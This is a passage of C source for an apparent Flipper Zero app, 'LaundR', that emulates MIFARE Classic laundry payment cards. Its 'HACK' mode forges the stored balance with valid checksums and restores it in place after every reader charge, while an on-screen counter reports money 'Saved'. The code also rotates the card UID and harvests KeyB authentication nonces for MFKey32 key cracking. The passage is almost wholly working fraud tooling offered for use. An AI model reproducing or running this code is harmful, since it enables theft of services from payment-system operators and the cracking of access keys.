    uint16_t cnt_inv = (uint16_t)b4[6] | ((uint16_t)b4[7] << 8);

    bool val_valid = ((val ^ val_inv) == 0xFFFF);
    bool cnt_valid = ((cnt ^ cnt_inv) == 0xFFFF);

    if(val_valid) {
        app->balance = val;
        app->original_balance = val;
    }

    if(cnt_valid) {
        app->counter = cnt;
    }

    FURI_LOG_I(TAG, "Parsed balance: %u cents, counter: %u", app->balance, app->counter);
}

// Update balance
static void laundr_update_balance(LaundRApp* app, uint16_t new_balance) {
    if(!app->modified_block_valid[4]) return;

    uint8_t* b4 = app->modified_blocks[4];

    b4[0] = new_balance & 0xFF;
    b4[1] = (new_balance >> 8) & 0xFF;
    b4[4] = (new_balance ^ 0xFF) & 0xFF;
    b4[5] = ((new_balance >> 8) ^ 0xFF) & 0xFF;

    b4[8] = b4[0];
    b4[9] = b4[1];

    app->balance = new_balance;
    app->has_modifications = true;

    if(app->modified_block_valid[8]) {
        memcpy(app->modified_blocks[8], b4, 16);
    }

    FURI_LOG_I(TAG, "Balance updated to: %u cents", new_balance);
}

// ============================================================================
// NFC EMULATION
// ============================================================================

// Rotate UID during emulation (called after each transaction)
static void laundr_rotate_uid(LaundRApp* app) {
    if(!app || !app->mfc_data) return;

    // Generate new UID
    uint32_t tick_value = furi_get_tick();
    uint8_t new_uid[4];
    new_uid[0] = (uint8_t)(tick_value & 0xFF);
    new_uid[1] = (uint8_t)((tick_value >> 8) & 0xFF);
    new_uid[2] = (uint8_t)((tick_value >> 16) & 0xFF);
    new_uid[3] = (uint8_t)((tick_value >> 24) & 0xFF) | 0x01;

    // Calculate BCC
    uint8_t bcc = new_uid[0] ^ new_uid[1] ^ new_uid[2] ^ new_uid[3];

    // Update block 0 in mfc_data
    app->mfc_data->block[0].data[0] = new_uid[0];
    app->mfc_data->block[0].data[1] = new_uid[1];
    app->mfc_data->block[0].data[2] = new_uid[2];
    app->mfc_data->block[0].data[3] = new_uid[3];
    app->mfc_data->block[0].data[4] = bcc;

    // Update ISO14443-3A UID
    memcpy(app->mfc_data->iso14443_3a_data->uid, new_uid, 4);

    // Store decimal
    app->current_uid_decimal = (new_uid[0] << 24) | (new_uid[1] << 16) | (new_uid[2] << 8) | new_uid[3];

    // Update emulation blocks
    memcpy(app->emulation_blocks[0], app->mfc_data->block[0].data, 16);

    app->transaction_count++;

    laundr_log_write("UID ROTATED: %02X %02X %02X %02X = %u (Transaction #%lu)",
        new_uid[0], new_uid[1], new_uid[2], new_uid[3],
        app->current_uid_decimal, app->transaction_count);

    // Update widget display
    widget_reset(app->widget);

    widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "EMULATING");

    snprintf(app->widget_str1, sizeof(app->widget_str1),
             "UID: %02X%02X%02X%02X", new_uid[0], new_uid[1], new_uid[2], new_uid[3]);
    widget_add_string_element(app->widget, 2, 14, AlignLeft, AlignTop, FontSecondary, app->widget_str1);

    snprintf(app->widget_str2, sizeof(app->widget_str2),
             "Dec: %lu", app->current_uid_decimal);
    widget_add_string_element(app->widget, 2, 24, AlignLeft, AlignTop, FontSecondary, app->widget_str2);

    snprintf(app->widget_str3, sizeof(app->widget_str3),
             "Transactions: %lu", app->transaction_count);
    widget_add_string_element(app->widget, 2, 34, AlignLeft, AlignTop, FontSecondary, app->widget_str3);

    if(app->last_charge_amount != 0) {
        char charge_str[32];
        snprintf(charge_str, sizeof(charge_str),
                 "Last: %s$%.2f",
                 app->last_charge_amount < 0 ? "-" : "+",
                 (double)abs(app->last_charge_amount) / 100);
        widget_add_string_element(app->widget, 2, 44, AlignLeft, AlignTop, FontSecondary, charge_str);
    }

    widget_add_string_element(app->widget, 2, 54, AlignLeft, AlignTop, FontSecondary, "Press Back to stop");
}

// NOTE: Removed listener callback - using NULL callback for pure default emulation
// Transaction tracking happens via timer polling (laundr_transaction_monitor_callback)

// Transaction monitor timer callback - ENHANCED: tracks ALL block reads/writes with byte details
static void laundr_transaction_monitor_callback(void* context) {
    LaundRApp* app = context;

    if(!app || !app->emulating || !app->nfc_listener) {
        return;
    }

    // CRITICAL FIX: Get LIVE data from the LISTENER, not the device!
    // nfc_device_get_data() returns our ORIGINAL data - never changes!
    // nfc_listener_get_data() returns the listener's INTERNAL data that the reader modifies
    const MfClassicData* live_data = (const MfClassicData*)nfc_listener_get_data(
        app->nfc_listener, NfcProtocolMfClassic);
    if(!live_data) {
        return;
    }

    uint32_t current_tick = furi_get_tick();

    // ═══════════════════════════════════════════════════════════════════════════
    // DEEP LOGGING: Compare ALL 64 blocks against our snapshot
    // ═══════════════════════════════════════════════════════════════════════════
    for(uint8_t block = 0; block < 64; block++) {
        const uint8_t* live_block = live_data->block[block].data;

        // Skip sector trailers (blocks 3, 7, 11, 15, ...) - they contain keys
        if((block + 1) % 4 == 0) continue;

        if(!app->snapshot_valid[block]) {
            // First snapshot - just record it
            memcpy(app->snapshot_blocks[block], live_block, 16);
            app->snapshot_valid[block] = true;
            continue;
        }

        // Compare current vs snapshot
        if(memcmp(app->snapshot_blocks[block], live_block, 16) != 0) {
            app->block_write_count[block]++;
            app->writes++;
            app->last_activity_tick = current_tick;

            // ═══════════════════════════════════════════════════════════════════
            // LOG THE EXACT BYTES THAT CHANGED - to transaction log
            // ═══════════════════════════════════════════════════════════════════
            laundr_log_transaction("");
            laundr_log_transaction("╔═══ BLOCK %02d WRITE DETECTED ════════════════════╗", block);
            laundr_log_transaction("║ Sector: %d  |  Block-in-sector: %d  |  Count: %lu",
                block / 4, block % 4, app->block_write_count[block]);
            laundr_log_transaction("╠════════════════════════════════════════════════╣");

            // Show BEFORE (old snapshot)
            laundr_log_transaction("║ BEFORE: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
                app->snapshot_blocks[block][0], app->snapshot_blocks[block][1],
                app->snapshot_blocks[block][2], app->snapshot_blocks[block][3],
                app->snapshot_blocks[block][4], app->snapshot_blocks[block][5],
                app->snapshot_blocks[block][6], app->snapshot_blocks[block][7],
                app->snapshot_blocks[block][8], app->snapshot_blocks[block][9],
                app->snapshot_blocks[block][10], app->snapshot_blocks[block][11],
                app->snapshot_blocks[block][12], app->snapshot_blocks[block][13],
                app->snapshot_blocks[block][14], app->snapshot_blocks[block][15]);

            // Show AFTER (current live data)
            laundr_log_transaction("║ AFTER:  %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
                live_block[0], live_block[1], live_block[2], live_block[3],
                live_block[4], live_block[5], live_block[6], live_block[7],
                live_block[8], live_block[9], live_block[10], live_block[11],
                live_block[12], live_block[13], live_block[14], live_block[15]);

            // Show which specific bytes changed
            laundr_log_transaction("║ CHANGED:");
            for(int i = 0; i < 16; i++) {
                if(app->snapshot_blocks[block][i] != live_block[i]) {
                    laundr_log_transaction("║   Byte[%02d]: %02X -> %02X (dec: %d -> %d)",
                        i, app->snapshot_blocks[block][i], live_block[i],
                        app->snapshot_blocks[block][i], live_block[i]);
                }
            }

            // Special decoding for known CSC blocks
            if(block == 4 || block == 8) {
                // Balance block
                uint16_t old_bal = (uint16_t)app->snapshot_blocks[block][0] |
                                   ((uint16_t)app->snapshot_blocks[block][1] << 8);
                uint16_t new_bal = (uint16_t)live_block[0] | ((uint16_t)live_block[1] << 8);
                int32_t change = (int32_t)new_bal - (int32_t)old_bal;
                laundr_log_transaction("║ BALANCE: $%.2f -> $%.2f (%s$%.2f)",
                    (double)old_bal / 100, (double)new_bal / 100,
                    change >= 0 ? "+" : "-", (double)(change >= 0 ? change : -change) / 100);
            }
            else if(block == 9) {
                // Timestamp block
                uint32_t old_ts = (uint32_t)app->snapshot_blocks[block][0] |
                                  ((uint32_t)app->snapshot_blocks[block][1] << 8) |
                                  ((uint32_t)app->snapshot_blocks[block][2] << 16) |
                                  ((uint32_t)app->snapshot_blocks[block][3] << 24);
                uint32_t new_ts = (uint32_t)live_block[0] |
                                  ((uint32_t)live_block[1] << 8) |
                                  ((uint32_t)live_block[2] << 16) |
                                  ((uint32_t)live_block[3] << 24);
                laundr_log_transaction("║ TIMESTAMP: %lu -> %lu", old_ts, new_ts);
            }
            else if(block == 12) {
                // Counter block
                uint16_t old_cnt = (uint16_t)app->snapshot_blocks[block][4] |
                                   ((uint16_t)app->snapshot_blocks[block][5] << 8);
                uint16_t new_cnt = (uint16_t)live_block[4] | ((uint16_t)live_block[5] << 8);
                laundr_log_transaction("║ COUNTER: %d -> %d", old_cnt, new_cnt);
            }

            laundr_log_transaction("╚════════════════════════════════════════════════╝");

            // Update snapshot with new data
            memcpy(app->snapshot_blocks[block], live_block, 16);
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // BALANCE MONITORING (HACK MODE ONLY) - Reset on transaction
    // ═══════════════════════════════════════════════════════════════════════════
    if(app->mode == LaundRModeHack) {
        const uint8_t* block4 = live_data->block[4].data;
        uint16_t current_balance = (uint16_t)block4[0] | ((uint16_t)block4[1] << 8);
        uint16_t current_balance_inv = (uint16_t)block4[4] | ((uint16_t)block4[5] << 8);

        // Validate checksum
        if((current_balance ^ current_balance_inv) == 0xFFFF) {
            if(current_balance != app->last_monitored_balance) {
                int32_t change = (int32_t)current_balance - (int32_t)app->last_monitored_balance;

                if(change < 0) {
                    // Balance decreased - reader charged us!
                    app->transaction_count++;
                    app->last_charge_amount = (int16_t)change;

                    // Count total block writes for this transaction
                    uint32_t total_block_writes = 0;
                    for(int i = 0; i < 64; i++) {
                        total_block_writes += app->block_write_count[i];
                    }

                    // Log to transaction log (human readable)
                    // NOTE: Keep logging minimal in timer callback to avoid stack overflow
                    laundr_log_transaction("");
                    laundr_log_transaction("╔═══════════════════════════════════════════════╗");
                    laundr_log_transaction("║  TRANSACTION #%lu COMPLETE                    ║", app->transaction_count);
                    laundr_log_transaction("║  Charged: -$%.2f                              ║", (double)(-change) / 100);
                    laundr_log_transaction("╚═══════════════════════════════════════════════╝");
                    laundr_log_transaction("Session Stats: Reads=%lu Writes=%lu", app->reads, app->writes);

                    // NOTE: CSV database write is DEFERRED to stop_emulation
                    // Timer callbacks have limited stack (~1KB) - heavy file I/O causes stack overflow
                    // The transaction data is already tracked in app->transaction_count, last_charge_amount

                    // IMPORTANT: Do NOT restart listener inside timer callback!
                    // Timer callbacks have limited stack - heavy NFC ops cause stack overflow
                    // Instead, just reset the balance in the listener's data directly

                    // Get the listener's data and reset balance in-place
                    // This avoids alloc/free which can cause stack issues in timer context
                    MfClassicData* listener_data_mut = (MfClassicData*)nfc_listener_get_data(
                        app->nfc_listener, NfcProtocolMfClassic);
                    if(listener_data_mut) {
                        // Reset balance block directly in listener's memory
                        memcpy(listener_data_mut->block[4].data, app->modified_blocks[4], 16);
                        if(app->modified_block_valid[8]) {
                            memcpy(listener_data_mut->block[8].data, app->modified_blocks[8], 16);
                        }

                        // NOTE: Do NOT rotate UID during active emulation!
                        // Modifying ISO14443-3A UID while listener is active causes Err 44
                        // UID rotation happens only when emulation is restarted

                        laundr_log_transaction("Balance reset IN-PLACE to $%.2f (same UID, ready for next tap)",
                            (double)app->balance / 100);
                    }

                    // Reset snapshots to detect next transaction
                    memset(app->snapshot_valid, 0, sizeof(app->snapshot_valid));

                    // Reset monitored balance
                    app->last_monitored_balance = app->balance;
                    laundr_log_transaction("");

                    // Update historical stats (in-memory, CSV written on stop)
                    app->history_tx_count++;
                    app->history_total_saved += change;  // change is negative, so this adds

                    // ═══════════════════════════════════════════════════════════════════
                    // UPDATE WIDGET DISPLAY - Show transaction stats live on screen
                    // ═══════════════════════════════════════════════════════════════════
                    widget_reset(app->widget);

                    widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "EMULATING");

                    // Show session transaction count
                    snprintf(app->widget_str1, sizeof(app->widget_str1),
                             "Session: %lu txns", app->transaction_count);
                    widget_add_string_element(app->widget, 2, 14, AlignLeft, AlignTop, FontSecondary, app->widget_str1);

                    // Show last charge amount
                    snprintf(app->widget_str2, sizeof(app->widget_str2),
                             "Last: -$%.2f", (double)(-change) / 100);
                    widget_add_string_element(app->widget, 2, 24, AlignLeft, AlignTop, FontSecondary, app->widget_str2);

                    // Show historical transaction count
                    snprintf(app->widget_str3, sizeof(app->widget_str3),
                             "All Time: %lu txns", app->history_tx_count);
                    widget_add_string_element(app->widget, 2, 34, AlignLeft, AlignTop, FontSecondary, app->widget_str3);

                    // Show total saved (history_total_saved is negative, so negate for display)
                    snprintf(app->widget_str4, sizeof(app->widget_str4),
                             "Saved: $%.2f", (double)(-app->history_total_saved) / 100);
                    widget_add_string_element(app->widget, 2, 44, AlignLeft, AlignTop, FontSecondary, app->widget_str4);

                    widget_add_string_element(app->widget, 2, 54, AlignLeft, AlignTop, FontSecondary, "Press Back to stop");
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CHECK FOR KEYB (WRITE KEY) NONCE CAPTURE - Update display when captured
    // ═══════════════════════════════════════════════════════════════════════════
    if(app->mfkey_keyb_count > app->mfkey_keyb_displayed) {
        // New KeyB nonce captured! Update display with exciting message
        app->mfkey_keyb_displayed = app->mfkey_keyb_count;

        laundr_log_transaction("!!! WRITE KEY NONCE CAPTURED !!! (#%zu)", app->mfkey_keyb_count);

        // Update the widget to show capture
        widget_reset(app->widget);
        widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "EMULATING");

        snprintf(app->widget_str1, sizeof(app->widget_str1),
                 "Session: %lu txns", app->transaction_count);
        widget_add_string_element(app->widget, 2, 14, AlignLeft, AlignTop, FontSecondary, app->widget_str1);

        snprintf(app->widget_str2, sizeof(app->widget_str2),
                 "All Time: %lu txns", app->history_tx_count);
        widget_add_string_element(app->widget, 2, 24, AlignLeft, AlignTop, FontSecondary, app->widget_str2);

        // HIGHLIGHT: Write nonce captured!
        snprintf(app->widget_str3, sizeof(app->widget_str3),
                 ">>> WRITE NONCE #%zu <<<", app->mfkey_keyb_count);
        widget_add_string_element(app->widget, 64, 34, AlignCenter, AlignTop, FontSecondary, app->widget_str3);

        snprintf(app->widget_str4, sizeof(app->widget_str4),
                 "KeyB: %zu  Total: %zu", app->mfkey_keyb_count, app->mfkey_nonce_count);
        widget_add_string_element(app->widget, 2, 44, AlignLeft, AlignTop, FontSecondary, app->widget_str4);

        widget_add_string_element(app->widget, 2, 54, AlignLeft, AlignTop, FontSecondary, "Run MFKey32 to crack!");

        // Vibration feedback for KeyB capture
        notification_message(app->notifications, &sequence_single_vibro);
    }
}

static void laundr_start_emulation(LaundRApp* app) {
    const char* mode_name = app->mode == LaundRModeHack ? "HACK" :
                            app->mode == LaundRModeLegit ? "LEGIT" : "INTERROGATE";
    FURI_LOG_I(TAG, "Starting emulation in %s mode", mode_name);

    // Log to both transaction and system logs
    laundr_log_transaction("=== EMULATION STARTED ===");
    laundr_log_transaction("Mode: %s", mode_name);
    laundr_log_transaction("Provider: %s", app->provider);
    laundr_log_transaction("Balance: $%.2f", (double)app->balance / 100);

    laundr_log_system("=== EMULATION STARTED ===");
    laundr_log_system("Mode: %s | Provider: %s | Balance: $%.2f",
        mode_name, app->provider, (double)app->balance / 100);

    // INTERROGATION MODE INITIALIZATION
    if(app->mode == LaundRModeInterrogate) {
        laundr_log_transaction("");
        laundr_log_transaction("╔═══════════════════════════════════════════════╗");
        laundr_log_transaction("║  INTERROGATION MODE - READER ANALYSIS        ║");
        laundr_log_transaction("╚═══════════════════════════════════════════════╝");

        // Reset interrogation data
        memset(&app->interrogation, 0, sizeof(InterrogationData));
        app->interrogation_active = true;

        laundr_log_transaction("Tracking all NFC events to analyze reader behavior");
        laundr_log_transaction("Waiting for reader interaction...");
        laundr_log_transaction("");
    }

    // Parse and log UID in multiple formats
    uint8_t uid_bytes[4] = {0};
    // Log UID - check for RANDOMIZED mode (MasterCard) or hex string
    if(strcmp(app->uid, "RANDOMIZED") == 0) {
        // MasterCard mode - UID is in block 0, log it from there
        uint8_t* b0 = app->modified_blocks[0];
        laundr_log_transaction("UID (RANDOMIZED MasterKey mode)");
        laundr_log_transaction("UID (Hex): %02X %02X %02X %02X", b0[0], b0[1], b0[2], b0[3]);
        laundr_log_transaction("UID (Dec): %u", (b0[0] << 24) | (b0[1] << 16) | (b0[2] << 8) | b0[3]);
    } else if(strlen(app->uid) >= 8) {
        for(int i = 0; i < 4; i++) {
            char byte_str[3] = {app->uid[i*2], app->uid[i*2+1], '\0'};
            uid_bytes[i] = (uint8_t)strtol(byte_str, NULL, 16);
        }
        laundr_log_transaction("UID (Hex): %02X %02X %02X %02X", uid_bytes[0], uid_bytes[1], uid_bytes[2], uid_bytes[3]);
        laundr_log_transaction("UID (Dec): %u", (uid_bytes[0] << 24) | (uid_bytes[1] << 16) | (uid_bytes[2] << 8) | uid_bytes[3]);
    } else {
        laundr_log_transaction("UID: %s (len=%zu)", app->uid, strlen(app->uid));
    }

    // Copy modified blocks to emulation blocks
    memcpy(app->emulation_blocks, app->modified_blocks, sizeof(app->modified_blocks));
    memcpy(app->emulation_block_valid, app->modified_block_valid, sizeof(app->modified_block_valid));

    app->reads = 0;
    app->writes = 0;
    app->writes_blocked = 0;

    // Initialize DEEP LOGGING - reset snapshot tracking for this session
    memset(app->snapshot_valid, 0, sizeof(app->snapshot_valid));
    memset(app->block_read_count, 0, sizeof(app->block_read_count));
    memset(app->block_write_count, 0, sizeof(app->block_write_count));
    app->last_activity_tick = 0;
    app->deep_logging_enabled = true;
    laundr_log_system("Deep logging ENABLED - tracking all block changes");

    // Initialize NFC if needed
    if(!app->nfc) {
        laundr_log_system("Allocating NFC instance...");
        app->nfc = nfc_alloc();
    }

    // Clean up old device
    if(app->nfc_device) {
        laundr_log_system("Freeing old NFC device...");
        nfc_device_free(app->nfc_device);
    }

    laundr_log_system("Allocating new NFC device...");
    app->nfc_device = nfc_device_alloc();

    // Build MfClassic data structure from our parsed blocks
    laundr_log_system("Allocating MfClassic data...");
    MfClassicData* mfc_data = mf_classic_alloc();
    if(!mfc_data) {
        FURI_LOG_E(TAG, "Failed to allocate MfClassic data");
        laundr_log_system("ERROR: Failed to allocate MfClassic data");
        nfc_device_free(app->nfc_device);
        app->nfc_device = NULL;

        popup_reset(app->popup);
        popup_set_header(app->popup, "Error", 64, 20, AlignCenter, AlignCenter);
        popup_set_text(app->popup, "Out of memory", 64, 35, AlignCenter, AlignCenter);
        popup_set_timeout(app->popup, 2000);
        popup_set_context(app->popup, app);
        popup_set_callback(app->popup, NULL);
        popup_enable_timeout(app->popup);
        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewPopup);
        return;
    }

    // Set card type (1K card)
    mfc_data->type = MfClassicType1k;

    // CRITICAL: Copy modified_blocks → emulation_blocks to start fresh with original balance
    // This ensures every emulation starts with the unmodified balance (e.g., $50.00)
    laundr_log_system("Resetting emulation_blocks to original balance from modified_blocks");
    for(int block = 0; block < 64; block++) {
        if(app->modified_block_valid[block]) {
            memcpy(app->emulation_blocks[block], app->modified_blocks[block], 16);
            app->emulation_block_valid[block] = true;
        }
    }

    // Initialize ISO14443-3A data from Block 0
    if(app->emulation_block_valid[0]) {
        // Block 0 format: [UID bytes 0-3] [BCC] [manufacturer data]
        // Extract 4-byte UID from block 0
        mfc_data->iso14443_3a_data->uid_len = 4;
        memcpy(mfc_data->iso14443_3a_data->uid, app->emulation_blocks[0], 4);

        // Set ATQA (Answer To Request Type A) - standard for MIFARE Classic 1K
        mfc_data->iso14443_3a_data->atqa[0] = 0x04;
        mfc_data->iso14443_3a_data->atqa[1] = 0x00;

        // Set SAK (Select Acknowledge) - 0x08 for MIFARE Classic 1K
        mfc_data->iso14443_3a_data->sak = 0x08;

        uint8_t* uid = mfc_data->iso14443_3a_data->uid;
        laundr_log_transaction("UID (Hex): %02X %02X %02X %02X", uid[0], uid[1], uid[2], uid[3]);
        laundr_log_transaction("UID (Dec): %u", (uid[0] << 24) | (uid[1] << 16) | (uid[2] << 8) | uid[3]);
    }

    // Copy our blocks into the MfClassic structure
    // The NFC stack will read keys directly from sector trailers (same as default NFC app)
    for(int block = 0; block < 64; block++) {
        if(app->emulation_block_valid[block]) {
            memcpy(mfc_data->block[block].data, app->emulation_blocks[block], 16);
        }
    }

    laundr_log_system("Block data copied - NFC stack will read keys from trailers automatically");

    // Log card metadata to transaction log
    laundr_log_transaction("--- CARD INFORMATION ---");
    laundr_log_transaction("Card file: %s", furi_string_get_cstr(app->file_path));
    laundr_log_transaction("Balance: $%.2f", (double)app->balance / 100);
    laundr_log_system("Using PURE default NFC stack emulation (identical to default NFC app)");

    // Log detailed block data for critical sectors 0-3 (where balance/data lives)
    // This logging happens for BOTH modes - goes to transaction log
    laundr_log_transaction("--- DETAILED SECTOR DATA DUMP ---");
    for(int sector = 0; sector < 4; sector++) {
        laundr_log_transaction("Sector %d:", sector);
        for(int block_offset = 0; block_offset < 4; block_offset++) {
            int block_num = sector * 4 + block_offset;
            if(app->emulation_block_valid[block_num]) {
                uint8_t* block = app->emulation_blocks[block_num];

                // Log block with hex dump
                laundr_log_transaction("  Block %2d: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
                    block_num,
                    block[0], block[1], block[2], block[3],
                    block[4], block[5], block[6], block[7],
                    block[8], block[9], block[10], block[11],
                    block[12], block[13], block[14], block[15]);

                // Add interpretation for specific blocks
                if(block_num == 4) {
                    uint16_t balance = (uint16_t)block[0] | ((uint16_t)block[1] << 8);
                    uint16_t counter = (uint16_t)block[2] | ((uint16_t)block[3] << 8);
                    uint16_t bal_inv = (uint16_t)block[4] | ((uint16_t)block[5] << 8);
                    uint16_t cnt_inv = (uint16_t)block[6] | ((uint16_t)block[7] << 8);
                    bool bal_valid = ((balance ^ bal_inv) == 0xFFFF);
                    bool cnt_valid = ((counter ^ cnt_inv) == 0xFFFF);

                    laundr_log_transaction("            Balance: %u cents ($%.2f) %s",
                        balance, (double)balance/100, bal_valid ? "[VALID]" : "[INVALID CHECKSUM!]");
                    laundr_log_transaction("            Counter: %u %s",
                        counter, cnt_valid ? "[VALID]" : "[INVALID CHECKSUM!]");
                }
            } else {
                laundr_log_transaction("  Block %2d: [NOT VALID]", block_num);
            }
        }
    }
    laundr_log_transaction("--- END SECTOR DATA DUMP ---");

    // Store the data pointer for cleanup later
    if(app->mfc_data) {
        mf_classic_free(app->mfc_data);
    }
    app->mfc_data = mfc_data;

    laundr_log_system("Setting MfClassic data to device...");
    nfc_device_set_data(app->nfc_device, NfcProtocolMfClassic, mfc_data);
    laundr_log_system("MfClassic data set successfully");

    // Get the data back from the device
    laundr_log_system("Getting MfClassic data from device...");
    const MfClassicData* mfc_data_const = nfc_device_get_data(app->nfc_device, NfcProtocolMfClassic);
    if(!mfc_data_const) {
        FURI_LOG_E(TAG, "Failed to get MfClassic data from device");
        laundr_log_system("ERROR: Failed to get MfClassic data from device");
        nfc_device_free(app->nfc_device);
        app->nfc_device = NULL;

        popup_reset(app->popup);
        popup_set_header(app->popup, "Error", 64, 20, AlignCenter, AlignCenter);
        popup_set_text(app->popup, "Failed to prepare card", 64, 35, AlignCenter, AlignCenter);
        popup_set_timeout(app->popup, 2000);
        popup_set_context(app->popup, app);
        popup_set_callback(app->popup, NULL);
        popup_enable_timeout(app->popup);
        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewPopup);
        return;
    }

    laundr_log_system("MfClassic data ready for emulation");

    // Initialize transaction stats for THIS emulation session
    app->last_charge_amount = 0;
    // DON'T reset transaction_count - it should persist across emulation sessions

    // Get current UID for MFKey setup later
    uint8_t* current_uid = app->emulation_blocks[0];

    // Show LIVE emulation screen with transaction stats
    widget_reset(app->widget);

    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "EMULATING");

    // Show session transaction count
    snprintf(app->widget_str1, sizeof(app->widget_str1),
             "Session: %lu txns", app->transaction_count);
    widget_add_string_element(
        app->widget, 2, 14, AlignLeft, AlignTop, FontSecondary, app->widget_str1);

    // Show historical transaction count
    snprintf(app->widget_str2, sizeof(app->widget_str2),
             "All Time: %lu txns", app->history_tx_count);
    widget_add_string_element(
        app->widget, 2, 24, AlignLeft, AlignTop, FontSecondary, app->widget_str2);

    // Show total saved
    snprintf(app->widget_str3, sizeof(app->widget_str3),
             "Saved: $%.2f", (double)(-app->history_total_saved) / 100);
    widget_add_string_element(
        app->widget, 2, 34, AlignLeft, AlignTop, FontSecondary, app->widget_str3);

    // Show nonce capture status (will be updated by monitor)
    snprintf(app->widget_str4, sizeof(app->widget_str4),
             "KeyB Nonces: %zu", app->mfkey_keyb_count);
    widget_add_string_element(
        app->widget, 2, 44, AlignLeft, AlignTop, FontSecondary, app->widget_str4);
    widget_add_string_element(
        app->widget, 2, 54, AlignLeft, AlignTop, FontSecondary, "Press Back to stop");

    // Set input callback to handle button presses
    View* widget_view = widget_get_view(app->widget);
    view_set_input_callback(widget_view, laundr_widget_input_callback);
    view_set_context(widget_view, app);

    // Start emulation notification BEFORE switching view
    notification_message(app->notifications, &sequence_blink_start_cyan);

    // Set up MFKey32 nonce capture - passive key harvesting
    app->mfkey_cuid = (uint32_t)current_uid[0] << 24 |
                      (uint32_t)current_uid[1] << 16 |
                      (uint32_t)current_uid[2] << 8 |
                      (uint32_t)current_uid[3];
    app->mfkey_capture_enabled = true;
    laundr_log_system("MFKey capture enabled (CUID: %08lX)", (unsigned long)app->mfkey_cuid);

    // Create and start NFC listener with our callback for nonce capture
    laundr_log_system("Creating NFC listener...");
    app->nfc_listener = nfc_listener_alloc(app->nfc, NfcProtocolMfClassic, mfc_data_const);
    laundr_log_system("Starting NFC listener with nonce capture callback...");
    // Use our callback to capture authentication nonces for MFKey32 cracking
    nfc_listener_start(app->nfc_listener, laundr_emulation_callback, app);
    laundr_log_system("NFC listener started with MFKey nonce capture");

    // Set flag BEFORE view switch
    app->emulating = true;
    laundr_log_system("Emulating flag set to TRUE (before view switch)");

    // Start transaction monitor timer (checks for balance changes every 250ms)
    if(app->mode == LaundRModeHack) {
        app->last_monitored_balance = app->balance;  // Initialize with original balance
        if(!app->transaction_monitor_timer) {
            app->transaction_monitor_timer = furi_timer_alloc(
                laundr_transaction_monitor_callback, FuriTimerTypePeriodic, app);
        }
        furi_timer_start(app->transaction_monitor_timer, 250);  // Check every 250ms
        laundr_log_system("Transaction monitor timer started (250ms interval)");
    }

    laundr_log_system("About to switch to widget view...");
    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);

    laundr_log_system("Returned from view switch");
    laundr_log_system("Checking flag after view switch: emulating=%d", app->emulating);

    FURI_LOG_I(TAG, "NFC listener started - Mode: %s",
               app->mode == LaundRModeHack ? "HACK" : "LEGIT");
    laundr_log_system("<<< laundr_start_emulation() complete - emulating=%d", app->emulating);
}


// ============================================================================
// UI HELPERS
// ============================================================================


static void laundr_show_card_info(LaundRApp* app) {
    // Validate app and its components
    if(!app || !app->widget || !app->view_dispatcher) {
        FURI_LOG_E(TAG, "Invalid app state in laundr_show_card_info");
        laundr_log_write("ERROR: NULL pointers in laundr_show_card_info - app=%p, widget=%p, dispatcher=%p",
            (void*)app, app ? (void*)app->widget : NULL, app ? (void*)app->view_dispatcher : NULL);
        return;
    }

    if(!app->card_loaded) {
        FURI_LOG_W(TAG, "Attempted to show card info without loaded card");
        laundr_log_write("WARNING: Attempted to show card info without loaded card");
        return;
    }

    laundr_log_write("Showing card info...");
    widget_reset(app->widget);

    double balance_dollars = (double)app->balance / 100;

    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "Card Info");

    snprintf(app->widget_str1, sizeof(app->widget_str1), "%s", app->provider);
    widget_add_string_element(
        app->widget, 2, 13, AlignLeft, AlignTop, FontSecondary, app->widget_str1);

    // Check if UID is "RANDOMIZED" (MasterCard mode) or a hex string
    if(strcmp(app->uid, "RANDOMIZED") == 0) {
        // MasterCard mode - show RANDOMIZED
        snprintf(app->widget_str2, sizeof(app->widget_str2), "UID: RANDOMIZED");
        widget_add_string_element(
            app->widget, 2, 22, AlignLeft, AlignTop, FontSecondary, app->widget_str2);

        snprintf(app->widget_str6, sizeof(app->widget_str6), "Dec: RANDOMIZED");
        widget_add_string_element(
            app->widget, 2, 30, AlignLeft, AlignTop, FontSecondary, app->widget_str6);
    } else {
        // Parse UID bytes from string (stored as hex without spaces, e.g., "DBDCDA74")
        uint8_t uid_bytes[4] = {0};
        if(strlen(app->uid) >= 8) {
            for(int i = 0; i < 4; i++) {
                char byte_str[3] = {app->uid[i*2], app->uid[i*2+1], '\0'};
                uid_bytes[i] = (uint8_t)strtol(byte_str, NULL, 16);
            }
        }

        // Display UID in hex (big-endian) - stacked vertically
        snprintf(app->widget_str2, sizeof(app->widget_str2),
                 "UID: %02X%02X%02X%02X",
                 uid_bytes[0], uid_bytes[1], uid_bytes[2], uid_bytes[3]);
        widget_add_string_element(
            app->widget, 2, 22, AlignLeft, AlignTop, FontSecondary, app->widget_str2);

        // Show decimal value on next line
        uint32_t uid_dec = (uid_bytes[0] << 24) | (uid_bytes[1] << 16) | (uid_bytes[2] << 8) | uid_bytes[3];
        snprintf(app->widget_str6, sizeof(app->widget_str6), "Dec: %lu", uid_dec);
        widget_add_string_element(
            app->widget, 2, 30, AlignLeft, AlignTop, FontSecondary, app->widget_str6);
    }

    // Balance - show original comparison if different
    if(app->balance != app->original_balance && app->original_balance > 0) {
        // Show current with original in smaller text
        snprintf(app->widget_str3, sizeof(app->widget_str3),
                 "$%.2f (<$%.2f)", balance_dollars, (double)app->original_balance / 100);
    } else {
        snprintf(app->widget_str3, sizeof(app->widget_str3), "Bal: $%.2f", balance_dollars);
    }
    widget_add_string_element(
